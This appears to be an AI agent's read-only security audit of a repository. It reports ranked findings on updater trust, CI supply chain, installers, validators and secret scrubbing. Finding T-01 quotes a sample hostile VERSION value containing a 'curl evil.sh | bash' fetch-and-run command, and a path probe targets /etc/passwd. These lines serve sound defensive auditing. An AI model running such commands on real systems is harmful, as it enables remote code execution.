# SPS2 ROUND 20B — DEEP SECURITY, RELIABILITY, AND REGRESSION AUDIT

Report time: 2026-10-16T19:10:28+06:00 (suffix 20261016-191028)
Audit window: 19:00:27 – 19:08:22 +06 (inspection and testing), report written 19:10.
Mission: deep, independent, read-only technical security and reliability
audit. Codex concurrently owns Round 20 (authorization reconciliation and
commit readiness); this audit deliberately does NOT duplicate that work — no
authorization matrix, no commit-boundary proposals. This round is an
auditor's round: findings only, remediation proposals only as
recommendations, no fixes.

**Safety compliance.** No source, test, schema, decision, evidence,
inventory, configuration, CMS, or CI file was modified. Nothing staged,
committed, pushed, fetched, pulled, deployed, published, or approved. No
installer, uninstaller, destructive script, or network-dependent smoke test
was executed. Nothing reset, cleaned, stashed, reverted, deleted, moved,
quarantined, or overwritten. All adversarial probes ran in `/tmp` fixtures
or in-memory; all test suites ran offline and are known non-mutating (see
§7). `user_approval`, `decided_by`, decision records, and gate results were
not altered. The only file created is this report.

---

## 1. Executive summary

The repository's **fail-closed core is real and holds under adversarial
probing**: the P10 gate honestly fails on withheld prerequisites (exit 1,
7 required-control failures, 0 integrity problems), the renderer refuses
draft content by default and its preview path leaks nothing into the
sitemap, the attribution module rejects every malformed/degenerate/duplicate
token policy I could construct, P17's argv path-confinement rejects both
absolute and symlink-laundered escapes, and the updater scripts refuse
dirty/non-Git sources before any network call. All 634 offline tests I ran
pass (§7), including the full P17 security/lifecycle/pinning battery.

Against that core, the audit found **one newly demonstrated high-severity
gap in the update trust chain** (T-01: a hostile or corrupted remote
`VERSION` freezes the 24-hour update cache forever via an unparsed-timestamp
path — verified by probe), **one verified cross-contract test failure that
prior rounds mislabeled as purely environmental** (T-02: two of the four
"SEO worktree-sensitive" failures are the SEO legacy-preservation contract
correctly detecting the DEC-7201-ratified updater edits as legacy
violations — a governance conflict, not noise), and a set of medium/low
findings, most corroborating earlier reports with new detail. The P17
scrubber's pattern list demonstrably misses five realistic secret shapes
(T-07, probed), though its documented defense-in-depth posture and the
minimal-environment control bound the impact. The `.claude/settings.json`
emptying remains unexplained but is now Codex's reconciliation item, not
re-litigated here.

No finding in this report was fixed. Every remediation proposal carries its
authorization status.

## 2. Exact live Git baseline

| Item | Value |
|---|---|
| Branch | `build/roadmap-p3-completion` |
| HEAD | `c49f3852e1c31d0136269c80fe58201b059af3ec` |
| Upstream | `origin/build/roadmap-p3-completion`, **0 ahead / 0 behind** |
| Porcelain | 33 entries (16 modified tracked + 17 untracked) — identical set to Round 19/19B |
| Staged | 0 |
| Stashes | 0 |
| Reports | 30 pre-existing at audit start (Round 19's report is file 30); **Codex's Round 20 report (`SPS2-ROUND20-AUTHORIZATION-RECONCILIATION-20261016-190200.md`) landed concurrently at 19:02, inside this audit's window** (see §8); this report is file 32 |

Reconciliation with prior reports: Round 18 recorded 33 porcelain / 0
staged / 0 stashes; Round 19 recorded the same plus 137 untracked paths
(expanded file count within the same 17 untracked top-level entries); Round
19B re-verified the same. **The live state matches all three; no historical
count drifted.** Round 19's HOLD classifications (`.claude/settings.json`,
SPEC-2 files, P10-EVIDENCE, LEGACY-* decisions, P17 evidence/tasks) are
preserved untouched.

## 3. Audit scope and excluded actions

**Inspected first-hand:** `install.sh` (full), `install.ps1` (targeted),
`uninstall.sh` (grep), `get-sps.sh`/`get-sps.ps1`, `scripts/bootstrap-sps.sh`,
`scripts/sps-update.sh`, `scripts/update-sps.ps1`, all three
`skills/sps/scripts/` mirrors, `scripts/smoke-sps.sh`,
`scripts/check-update.sh`, `scripts/check-update.ps1` (targeted),
`.github/workflows/sps-ci.yml` (full, read-only), `sps2/tools/check_sps2.py`
(full), `sps2/tools/check_p10_inventory.py` (targeted),
`sps2/tools/p10_runtime_gate.py` (targeted: digest, approval, evidence
controls), `sps2/tools/isolation_validator.py` (full),
`sps2/p17/confinement.py` (full), `sps2/p17/execution.py` (full),
`sps2/p17/scrub.py` (full), `sps2/p17/__main__.py` (targeted),
`sps2/governance/attribution.py` + policy, `domain/cms/output_safety.py`
(full), `domain/cms/persistence.py` (full), `domain/frontend/home_render.py`
(full render/build path), `domain/seo/isolation.py` (targeted), the P10
slice/evidence/inventory/schema contracts, `.github/expected-test-modules.txt`,
and the five named prior reports.

**Excluded actions (per restrictions):** no installer/uninstaller execution
(S-03/S-04/S-05 class findings are source-verified, not executed); no
network-dependent smoke test; no CI modification; no validator weakening; no
fixes; no authorization matrix (Codex's task).

## 4. Findings — ranked

Severity scale: Critical / High / Medium / Low / Informational. Status per
finding: **REPRODUCED** (demonstrated by probe/fixture), **SOURCE-VERIFIED**
(code path confirmed by inspection), or **THEORETICAL**.

### T-01 — HIGH — Hostile remote VERSION permanently freezes the update cache (REPRODUCED)

- **Where:** `scripts/check-update.sh:46-58` (`is_greater`), `:66-67`
  (TTL arithmetic on `CHECKED_AT`), `:88` (offline state write). Mirrored
  logically in `scripts/check-update.ps1`.
- **Preconditions:** the updater's trust chain treats the remote
  `VERSION` file (`raw.githubusercontent.com/…/main/skills/sps/VERSION`,
  fetched with `curl -fsSL --max-time 10` at `:82`) as trusted input, and
  the local state file `~/.sps/update-state.env` as trusted input.
- **Scenario A (remote):** a compromised or corrupted remote VERSION
  containing non-numeric components (e.g. `1.2.4; curl evil.sh | bash`) makes
  `is_greater`'s `(( 10#$av > 10#$bv ))` raise arithmetic syntax errors.
  Under `set -uo pipefail` (no `-e`), execution **falls through to the
  else-branch and the script continues** — verified by probe: the script
  prints "NOT rc=1" and continues. The malformed `LATEST` value is then
  written to the state file and echoed to the user. No command injection
  occurs (arithmetic context, not `eval`) — but see Scenario B.
- **Scenario B (state file, REPRODUCED):** `CHECKED_AT` is grepped from the
  state file and used in `(( now - last < TTL_SECONDS ))` with **no numeric
  validation**. A state file containing `CHECKED_AT=99999999999999` (from
  corruption, a hostile `LATEST`-style injection into the file, or clock
  manipulation) passes the freshness test forever: probe output —
  `TTL says fresh (huge future timestamp freezes cache forever)`. Once
  frozen, `--check` (non-force) never contacts the network again, so the
  user never learns of security updates. `sps-update.sh --yes` calls
  `checker` (which uses the cached result) before updating, so the frozen
  cache **suppresses the entire update path** for non-force modes.
- **Reproduction status:** REPRODUCED (Scenario B, isolated fixture in
  `/tmp`; Scenario A, isolated `bash -c` reproducing the exact script
  shape).
- **Existing test coverage:** none — `sps2/tests/test_updater_safety.py`
  covers dirty/non-Git refusal and destructive-fallback absence, not
  version-parsing or state-file handling.
- **Minimal remediation:** validate `CHECKED_AT` as `^[0-9]{1,12}$` before
  arithmetic (treat garbage as stale); validate remote `LATEST` against
  `^[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$` before writing state or
  comparing; treat unparseable remote versions as "offline", not
  "up-to-date".
- **Authorization:** check-update.sh is a ratified-adjacent updater file
  (DEC-7201 covers the eight updater files + test module; check-update.sh
  is invoked by them). Remediation requires a User decision; not authorized
  this round.

### T-02 — HIGH — SEO legacy-preservation contract now conflicts with the ratified updater workstream (REPRODUCED; partially new)

- **Where:** `domain/seo/isolation.py:238-260` (`verify_legacy_diff_zero`,
  `LEGACY_DIRECTORIES = ("skills", "scripts", "plugins", "templates")` at
  `:77`); failing tests `test_legacy_diff_zero` and
  `test_zero_orphan_references_across_repository`
  (`domain/seo/tests/test_isolation.py:114, 133`).
- **Preconditions:** none — fails on the current live worktree.
- **Scenario:** `verify_legacy_diff_zero` runs `git diff HEAD -- skills
  scripts plugins …` and requires **exactly zero** diff. The DEC-7201
  ratified updater edits modify `skills/sps/scripts/*` (legacy mirror
  copies) and `scripts/*`, so the check reports 2 violations — probed live:
  `Legacy directory 'skills' has uncommitted modifications: diff --git
  a/skills/sps/scripts/bootstrap-sps.sh…` and the same for `scripts`.
  Round 16's report classified all four SEO failures as
  "worktree-sensitive"; this audit shows **two of the four are a genuine
  cross-contract conflict**: a User-ratified change (DEC-7201) permanently
  violates a standing preservation contract the moment it is committed.
  After any future commit of the updater work, `git diff HEAD` becomes
  empty and the test *silently passes again* — the conflict disappears
  without ever being decided.
- **The other two failures** (`test_live_rollback_rehearsal_success`,
  `test_live_status_reporting`) assert against live git status and remain
  genuinely worktree-sensitive (they fail on any dirty tree, including the
  pre-existing 33-entry state) — consistent with the prior classification.
- **Also probed:** `scan_for_orphan_imports` reports 4 violations from
  `domain/frontend/home_render.py:66-75` importing `domain.seo.*` — the
  Home renderer (Round 13–14 authorized) imports the very subsystem the
  orphan contract exists to prove removable. Same structural pattern: an
  authorized workstream violating a standing contract, currently visible
  only as a red test.
- **Reproduction status:** REPRODUCED (live probes, read-only).
- **Existing test coverage:** the failing tests ARE the coverage; no test
  encodes the intended precedence between DEC-7201 and the legacy contract.
- **Minimal remediation:** a User decision establishing precedence — either
  (a) amend the legacy contract's allowlist to name the DEC-7201 file set,
  or (b) re-scope `LEGACY_DIRECTORIES`/orphan exclusions. Both are contract
  changes requiring authorization. **Do not** "fix" by weakening the
  assertions silently.
- **Authorization:** requires new User approval (contract change).

### T-03 — HIGH (carried, unresolved; corroborated with new detail) — CI executes installer with unpinned supply chain and no permission boundary (SOURCE-VERIFIED)

- **Where:** `.github/workflows/sps-ci.yml` — no `permissions:` or
  `concurrency:` block anywhere; mutable tags `checkout@v4`,
  `setup-node@v4`, `setup-python@v5`; smoke job sets
  `npm_config_yes=true` and runs `scripts/smoke-sps.sh:77`
  (`HOME="$SMOKE_HOME" bash install.sh --agents '*' --yes`).
- **New detail this round:** `install.sh:338-368` performs **27 unpinned
  `npx skills add` invocations against third-party GitHub repos**
  (nutlope/hallmark, vercel-labs/agent-skills ×5, anthropics/skills,
  mattpocock/skills, firecrawl, supabase, prisma, trailofbits-adjacent, …)
  plus `install.sh:373-392` adds **four unpinned claude plugin
  marketplaces** and installs 11 plugins from them. Each is arbitrary
  third-party content executed at install/CI time with auto-yes. CI's
  `MIN_TESTS=500` and module-manifest guards are well-built but protect
  only the test gate — the smoke job's supply-chain surface is untouched by
  any guard.
- **Reproduction status:** SOURCE-VERIFIED (execution forbidden by
  restrictions).
- **Existing test coverage:** none (installer deliberately out of test
  scope).
- **Remediation:** pin every action to commit SHA; add a least-privilege
  `permissions:` block; either pin skill sources or drop the network smoke
  from CI. **CI changes are NOT AUTHORIZED** (DEC-7203) — requires User
  decision.

### T-04 — MEDIUM (carried, unresolved) — installer destroys before copying with no backup; PS variant swallows failures (SOURCE-VERIFIED)

- **Where:** `install.sh:254-263` (`sync_core_skill`: `rm -rf
  "$dest_root/sps"` then `cp -R`; same for `sps-cms`); `install.ps1:165-188`
  (`Sync-CoreSkill`: `Remove-Item -Recurse -Force $dest` then `Copy-Item`,
  wrapped in a `catch` that only `note`s — **a failed copy after successful
  removal is silently downgraded to a note**, leaving the destination
  absent and the install continuing to the next of 11 sync roots).
- **New detail:** the PS catch-block swallow makes the failure mode strictly
  worse than bash: bash's `set -euo pipefail` at least aborts on copy
  failure; PowerShell continues and reports overall success. Across the 11
  `$syncRoots` (install.ps1:35-46) / 17 `SYNC_PATHS` (install.sh:32-50),
  a partial install is reported as a normal completion.
- **Reproduction status:** SOURCE-VERIFIED (destructive run prohibited).
- **Existing test coverage:** none; Round 17's Proposal B1 (timestamped
  backup, bounded retention, restore-on-failure) remains unimplemented
  pending authorization.
- **Remediation:** implement B1 or, minimally, make the PS catch re-throw
  after the removal step. Requires User authorization (installers are
  outside current authorization).

### T-05 — MEDIUM (carried, sharpened) — `check_sps2.py` exit code is 0 for every outcome including unreadable input (SOURCE-VERIFIED + probed)

- **Where:** `sps2/tools/check_sps2.py:283-299` (`main` returns 0 for
  malformed JSON, missing files, non-object documents, and all ERR paths;
  only usage/unknown-kind return 2).
- **Probed this round:** malformed JSON → `ERR not valid JSON…`, **exit 0**;
  nonexistent file → `ERR …`, **exit 0**; agent-attributed approval
  (`decided_by: "claude"`) → `ERR APPROVED attributed to non-user 'claude'`,
  **exit 0**. The controlled-ERR design (module docstring; import-failure
  guard at :33-54) is deliberate and its stdout contract is sound — but the
  exit-code contract means any consumer that shells out and checks `$?`
  scores every governance failure as clean. The P17 evidence records under
  `.sps/evidence/P17/` are additionally **structurally invisible** to this
  validator (they are flat records; the validator requires a top-level
  `records` collection — probed: `ERR document missing 'records' collection`,
  exit 0) — so no harness built on check_sps2.py has ever validated them.
- **Reproduction status:** REPRODUCED (probes in `/tmp`).
- **Existing test coverage:** `sps2/tests/test_shell_validator_policy_contract.py`
  (7 tests) covers the stdout contract, not the exit contract.
- **Remediation:** add a strict mode (`--exit-code`) or a wrapper that
  fails on any `ERR` line; register P17 evidence in a compatible shape.
  Requires User decision (validator change; also touches CI wiring, which
  is separately unauthorized).

### T-06 — MEDIUM — `validate-sps2.sh` foundation runner is RED on the live tree, and the red is the DEC-7201 conflict (REPRODUCED)

- **Where:** `sps2/tools/validate-sps2.sh:209-210` — `git diff --name-only
  HEAD -- skills scripts plugins .github install.sh install.ps1 uninstall.sh
  uninstall.ps1 get-sps.sh get-sps.ps1` must be empty ("legacy untouched").
- **Live result:** `== SPS2 FOUNDATION INVALID: 78 passed, 1 failed, 0
  missed ==` — the single failure is `legacy modified:` listing exactly the
  eight DEC-7201 files. This is the same T-02 conflict surfaced through the
  foundation runner. No prior SPS2 round report ran `validate-sps2.sh` on
  this worktree state (Round 18 ran module suites and per-file validators,
  not this runner), so this red has been standing since the updater edits
  landed. The runner's 27-case negative suite passes in full.
- **Reproduction status:** REPRODUCED.
- **Remediation:** same User decision as T-02 (precedence between
  DEC-7201 and the legacy-protection control). Note `validate-p3.sh` /
  `validate-p4.sh` trip on the same class (KI-16, DEC-0028 kept the legacy
  controls unchanged by design).

### T-07 — MEDIUM — P17 scrubber misses five realistic secret shapes (REPRODUCED; documented limitation, now demonstrated)

- **Where:** `sps2/p17/scrub.py:24-56` (`PATTERNS`).
- **Probed escapes** (all `leaked=True` through `scrub.scrub`): AWS
  **session** tokens (`ASIA…` — only `AKIA` is covered), Slack app-level
  tokens (`xapp-…` — only `xox[baprs]-`), GitLab PATs (`glpat-…`), base64
  encoded credentials (`cGFzc3dvcmQ6…`), and PEM blocks without interior
  spaces. Split-string constructions (`"abc" + "1234567890123456"`) are
  caught only by luck of the assignment pattern.
- **Mitigations that bound the impact (verified in source):** the executor
  passes a minimal explicit environment (`execution.py:67-106` — PATH is
  computed, parent env never inherited), intake rejects credential-like
  task input preventively, and the module docstring plus SEC-P17-06 state
  that pattern scrubbing is not proof of absence. Also verified sound: raw
  `.full` streams are deleted after digesting (`__main__.py:619-627`,
  `discard_capture`), transcripts are bounded at 8 MiB with explicit
  truncation markers, and the process tree is killed via
  `start_new_session` + `killpg` on timeout.
- **Reproduction status:** REPRODUCED (in-memory probes).
- **Existing test coverage:** `test_p17_security.py` (62 tests, all pass)
  tests the listed patterns; it does not test evasion shapes.
- **Remediation:** add the five shapes to `PATTERNS` (and negative tests);
  low-risk, but scrub.py is inside the P17 workstream — needs a User
  decision to edit.

### T-08 — LOW — `is_greater` mis-sorts versions with leading zeros / garbage components (REPRODUCED, benign direction)

- **Where:** `scripts/check-update.sh:46-58`. `10#08` handles leading
  zeros correctly (probed), but any alphabetic component errors (falling
  through to "update available" or "up to date" non-deterministically
  depending on where the error lands — probed: `abc` in remote → reported
  GREATER, i.e. "local ahead, up to date", **suppressing the update
  prompt**). Sub-case of T-01; listed separately because the
  suppress-update direction is the safe-side failure worth tracking.

### T-09 — LOW — `.claude/settings.json` remains an empty tracked file (SOURCE-VERIFIED)

- Unchanged since Round 19B: tracked content `{"enabledPlugins": {}}`
  (3 lines) replaced by 0 bytes; no decision record names it. Codex's Round
  20 owns provenance; recorded here only for baseline completeness. Not
  attributable to this session or, on the evidence available to this audit,
  to any report-declared work.

### T-10 — LOW / Informational — P17 confinement is detection-and-runner-mediated, not OS confinement; the honest framing holds (SOURCE-VERIFIED)

- **Verified sound:** `check_argv_paths` rejects absolute escapes
  (`/etc/passwd` → `PATH_ESCAPE_REJECTED`, probed) **and** symlink
  laundering inside the boundary (`sub/link` → outside target → rejected,
  probed); realpath is applied to both sides of the boundary comparison;
  the production allowlist (`opencode`) is refused before any spawn while
  GATE-P17-4 is OPEN (`__main__.py:33-40, 152-153`); approval binding
  recomputes plan/task SHA-256 digests and refuses pre-binding approvals
  (`__main__.py:100-125`).
- **Verified limitations (documented in-module, confirmed accurate):**
  non-path-like argv tokens (e.g. `-c`, bare names) are never path-checked
  (`looks_like_path` requires a separator or leading hint — probed); a
  write entirely outside the boundary is invisible without configured
  `watch_pairs` (slice 1 configures none); a check-then-spawn TOCTOU window
  exists in principle (path resolved at check time, token spawned as-given)
  — bounded by the same GATE-P17-4 disable. **Conclusion:** P17's claim
  that real-agent isolation is NOT established is accurate; the application
  controls are genuine but not OS-enforced, exactly as the module states.

### T-11 — Informational — duplicate JSON keys are silently last-wins in every loader (SOURCE-VERIFIED)

- `json.load` (stdlib, no `object_pairs_hook`) is used by
  `check_sps2.py:286`, `check_p10_inventory.py:132,539`,
  `persistence.py:57,78`, `attribution.py:58`, and the gate's `_load_json`
  (`p10_runtime_gate.py:309`). Probed: `{"decisions": [], "decisions":
  [{"decision_id": "BOGUS"}]}` → validator sees only `BOGUS`, no error.
  A duplicated key in any governance/CMS record silently replaces the
  earlier value. Exploitability is low (files are repo-controlled), but a
  digest-bound record whose duplicate keys differ between write and re-read
  would trip integrity checks confusingly. Remediation (a
  `object_pairs_hook` duplicate-rejecting loader) is a validator change —
  needs a User decision; Informational because no current file is affected.

### T-12 — Informational — renderer's single-sink escape contract is conventional, and the preview robots.txt permits crawling (SOURCE-VERIFIED)

- Verified sound: `encode_for_html` applied exactly once per value via the
  slot adapter before the f-string sink (`home_render.py:267-282`);
  draft fails closed by default (probed); preview build's sitemap has
  **zero** `<url>` entries (probed — draft never enters the sitemap);
  `noindex` present in preview HTML (probed); reparse stage 4 runs before
  any write (`:422-427`); `build_home_slice` writes only the three
  contract artifacts inside `build_dir`.
- Gap noted: the preview `robots.txt` is generated with
  `RobotsGroup(disallow=[])` (`:438-443`) — it permits crawling of the
  route while the page carries `noindex`. `noindex` wins for compliant
  crawlers, but a `Disallow: /` in the draft-preview case would be
  defense-in-depth. Minor; the preview path is itself a deferred-policy
  feature.

### Carried findings re-confirmed (no new inspection beyond hash + spot-read; details in prior reports)

- S-03-class: `install.sh:15-16` `StrictHostKeyChecking=no` +
  `GIT_CLONE_PROTECTION_ACTIVE=false`; `install.ps1:9-10` mirrors
  `StrictHostKeyChecking=no` + `npm_config_yes` (note: PS does **not** set
  `GIT_CLONE_PROTECTION_ACTIVE` — a bash/PS policy divergence).
- Uninstall scope: `uninstall.sh:218` `rm -rf "$HOME/.sps"`.
- CI: no permissions block, mutable tags (T-03).
- Updater mirror parity: `diff -rq scripts skills/sps/scripts` → identical
  (re-verified this round).

## 5. Evidence and reproduction status summary

| ID | Severity | Status | Repro artifact |
|---|---|---|---|
| T-01 | High | REPRODUCED (Scenario B) / SOURCE-VERIFIED (A) | `/tmp` state-file fixture; `bash -c` script-shape repro |
| T-02 | High | REPRODUCED | live read-only probes of `verify_legacy_diff_zero` / `scan_for_orphan_imports` |
| T-03 | High | SOURCE-VERIFIED | workflow + installer source read (execution prohibited) |
| T-04 | Medium | SOURCE-VERIFIED | installer source read |
| T-05 | Medium | REPRODUCED | `/tmp/r20b_malformed.json`, `/tmp/r20b_agent5.json`, `/tmp/r20b_dupkey.json` probes |
| T-06 | Medium | REPRODUCED | `validate-sps2.sh` live run |
| T-07 | Medium | REPRODUCED | in-memory scrub probes |
| T-08 | Low | REPRODUCED | `bash -c` arithmetic probes |
| T-09 | Low | SOURCE-VERIFIED | `git show HEAD:` vs live file |
| T-10 | Low/Info | SOURCE-VERIFIED + probed | confinement probes in `/tmp` fixtures |
| T-11 | Info | REPRODUCED | dup-key probe |
| T-12 | Info | SOURCE-VERIFIED + probed | in-memory preview build |

No finding is claimed reproduced beyond its stated status. Installer and
uninstaller defects are explicitly NOT executed.

## 6. Previously reported vs newly discovered

**Confirmed and still unresolved (prior reports → this audit):**
installer unsafe defaults + destructive sync (Codex SH-07, R15-005 → T-03,
T-04); CI permissions/mutable tags (Codex C-01/02 → T-03); check_sps2
always-exit-0 (Codex F-005 → T-05, now with probes); SEO 4 failures
(Round 16 "worktree-sensitive" → T-02/T-06, reclassified); stale P10
evidence (R15-009 — unchanged, held); `.claude/settings.json` (Round 19B
S-10 → T-09, ownership with Codex Round 20); attribution self-assertion
(UQ-ATT-2 — re-demonstrated: a fabricated `{"decided_by": "John Smith",
"decided_at": …}` approval passes `approval_is_user_attributable` → True,
probed; agent names still correctly rejected).

**Fixed / verified holding (no action):** R15-001/002/003 gate fixes (320
tests OK; vacuous-timestamp check now a real raw-suffix check); R15-004/007/008
updater fixes (13 tests, ordering verified); digests match live CMS
(gate cms-state-digest + p8-contract-digest PASS); mirror parity;
attribution token-shape validation (probed: degenerate, duplicate,
uppercase, leading-hyphen, underscore policies all rejected).

**Newly discovered this round:** T-01 (update-cache freeze), T-02's
contract-conflict classification (the two legacy-diff/orphan failures are
governance conflicts, not environment noise), T-06 (foundation runner
red), T-07's five demonstrated scrub escapes, T-08, T-11, T-12's robots
note, and the bash/PS `GIT_CLONE_PROTECTION_ACTIVE` divergence noted in
the carried section.

**Prior claims this audit could not substantiate:** none — every prior
claim re-inspected held. (Round 16's "SEO failures are worktree-sensitive"
was accurate for two of four but incomplete for the other two; see T-02.)

## 7. Tests run, skipped, and not run

**Run (all offline, non-mutating; hashes of all 14 scope files verified
identical before and after every batch):**

| Suite | Command | Result |
|---|---|---|
| P10 gate contract | `python3 -B -m unittest sps2.tests.test_p10_runtime_gate` | 320 tests, OK |
| P17 security | `…sps2.tests.test_p17_security` | 62 tests, OK |
| P17 lifecycle | `…sps2.tests.test_p17_lifecycle` | 44 tests, OK |
| P17 pinning | `…sps2.tests.test_p17_pinning` | 25 tests, OK |
| P17 e2e | `…sps2.tests.test_p17_endtoend` | 2 tests, OK (skipped=1: ajv/node absent) |
| P17 gate attribution | `…sps2.tests.test_p17_execution_gate_attribution` | 5 tests, OK |
| Attribution policy | `…sps2.tests.test_attribution_policy` | 68 tests, OK |
| P5 | `…sps2.tests.test_p5` | 48 tests, OK |
| P7 readiness | `…sps2.tests.test_p7_zero_adapter_readiness` | 3 tests, OK |
| Shell-validator policy | `…sps2.tests.test_shell_validator_policy_contract` | 7 tests, OK |
| Updater safety | `…sps2.tests.test_updater_safety` | 13 tests, OK (skipped=1: pwsh absent) |
| Frontend | `unittest discover -s domain/frontend/tests` | 85 tests, OK |
| CMS | `unittest discover -s domain/cms/tests` | 86 tests, OK |
| SEO | `unittest discover -s domain/seo` | 220 tests, **4 FAILED** (T-02) |
| Foundation runner | `bash sps2/tools/validate-sps2.sh` | 78 passed, **1 failed** (T-06); negative suite 27/27 |
| Real P10 gate | `python3 -B sps2/tools/p10_runtime_gate.py --slice …` | exit 1, FAIL 7 required controls (honest; matches Round 18) |
| Inventory validator | `check_p10_inventory.py --inventory …` + `--self-test` | OK; self-test 47/47 |

Artifact check before running: the suites used are the same modules Rounds
17/18 ran; the only repo-side writes they make are `__pycache__` bytecode
files (pre-existing, preserved; deletion prohibited). `smoke-sps.sh` was
NOT run (it executes the installer and may need network) — its temp dir
`.tmp-smoke-sps` confirmed absent beforehand and after.

**Skipped / environmental:** pwsh absent (PowerShell behavioral updater
test skipped — standing limitation); ajv/node absent for one P17 e2e
schema-validation test.

**Not run (prohibited or unsafe):** `install.sh`, `install.ps1`,
`uninstall.sh`, `bootstrap-sps.sh` against any real destination,
`smoke-sps.sh` (network + installer), anything touching the network, any
destructive path.

**Concurrent-change observation:** SHA-256 of 14 scope files snapshotted at
19:00 (`/tmp/r20b_hashes_start.txt`) and re-verified at 19:05 and 19:08 —
**all identical throughout**; porcelain stable at 33/0/0. No concurrent
edit landed in the window; nothing in the worktree is attributable to this
audit except this report.

## 8. Concurrent-change / hash observations

See §7. Additionally: upstream is 0/0 vs HEAD (no new pushes since
DEC-0032's authorized push); `git diff --cached` empty at start and end.
**One concurrent event observed:** Codex's Round 20 report
(`reports/SPS2-ROUND20-AUTHORIZATION-RECONCILIATION-20261016-190200.md`)
appeared at 19:02, between this audit's hash snapshots — it is a new
untracked file inside the already-untracked `reports/` directory, so the
porcelain count (33) and all 14 file hashes are unaffected. It is Codex's
work, not this audit's, and was not read or used as evidence for any
finding here (per the mission, Codex owns reconciliation; this audit is
independent).

## 9. Remediation proposals and authorization requirements

| ID | Proposal | Authorized now? |
|---|---|---|
| T-01 | Validate `CHECKED_AT` numerically; validate remote VERSION format; unparseable remote → offline, never "up to date" | **No** — updater file edit; DEC-7201 ratifies existing content, new changes need a User decision |
| T-02/T-06 | User decision on precedence between DEC-7201 and the legacy-preservation/orphan contracts; then a recorded contract amendment (allowlist or re-scope) — never a silent assertion weakening | **No** — contract change; DEC-0028 explicitly preserved legacy controls |
| T-03 | Pin CI actions to SHAs; add least-privilege `permissions:`; pin or drop network smoke | **No** — CI CHANGES NOT AUTHORIZED (DEC-7203) |
| T-04 | Implement Round 17 Proposal B1 (backup/restore/bounded retention); minimally, make install.ps1's catch re-throw post-removal failures | **No** — installers outside current authorization |
| T-05 | Add `--exit-code` strict mode or an ERR-failing wrapper; register P17 evidence in a validator-compatible shape | **No** — validator change; CI wiring separately unauthorized |
| T-07 | Add the five demonstrated secret shapes to `PATTERNS` + evasion regression tests | **No** — P17 workstream edit needs a User decision |
| T-12 | `Disallow: /` in draft-preview robots.txt | **No** — renderer edit; also a policy choice |
| T-09 | Resolve provenance (Codex Round 20 owns) | Codex's task |

## 10. Residual risk register

| # | Risk | Severity | Status |
|---|---|---|---|
| 1 | Update trust chain trusts remote VERSION and local state file without validation (T-01) | High | Open; needs updater change authorization |
| 2 | DEC-7201 vs legacy-preservation contract conflict — red tests will silently go green after the next commit without any decision (T-02/T-06) | High | Open; needs precedence decision |
| 3 | CI supply-chain surface (mutable tags, 27 unpinned third-party skill installs, 11 unpinned plugins) (T-03) | High | Open; CI changes not authorized |
| 4 | Installer partial-failure data loss, PS variant silent (T-04) | Medium | Proposal B1 pending since Round 17 |
| 5 | Governance validators' exit-0 contract (T-05) | Medium | Open |
| 6 | Scrub pattern gaps (T-07) | Medium | Bounded by minimal-env + intake rejection |
| 7 | UQ-ATT-2: approval attribution is self-asserted (re-demonstrated) | Standing | Approval-mechanism decision parked (OPTION A) |
| 8 | All ratified work uncommitted (0 staged) — durability risk unchanged | Medium | Codex Round 20 owns commit readiness |
| 9 | P17 isolation is application-level only (T-10) | Accepted by design | GATE-P17-4 OPEN keeps real agents disabled |
| 10 | Duplicate JSON keys last-wins in all loaders (T-11) | Informational | No current file affected |
| 11 | pwsh absent — PowerShell behavioral coverage skipped | Low | Environmental |

## 11. Decisions required from the User

1. **T-01** — authorize updater trust-chain hardening (version-format and
   state-file validation in `check-update.sh`/`.ps1`).
2. **T-02/T-06** — decide precedence between the DEC-7201 updater
   ratification and the legacy-preservation / orphan-import contracts, and
   authorize the resulting recorded contract amendment.
3. **T-03** — decide whether CI hardening (SHA pinning, permissions block,
   smoke scope) amends DEC-7203's CI prohibition.
4. **T-04** — authorize installer Proposal B1, or record acceptance of the
   destructive-sync risk.
5. **T-05** — authorize a strict-exit mode for `check_sps2.py` and a
   validator-compatible P17 evidence shape.
6. **T-07** — authorize the scrub-pattern extension.
7. **T-09** — (with Codex Round 20) resolve `.claude/settings.json`.
8. Standing: publication (DEFER), user approval (NOT GRANTED),
   commit/push (Codex Round 20), approval mechanism (OPTION A).

---

*Round 20B complete. Strictly read-only; exactly one file created (this
report); all 14 scope-file hashes identical start-to-end; 634 tests run
offline with 4 known failures, all characterized; every finding carries its
reproduction status and authorization requirement. Stopping here per the
mission — no remediation begun; awaiting a separate User instruction.*
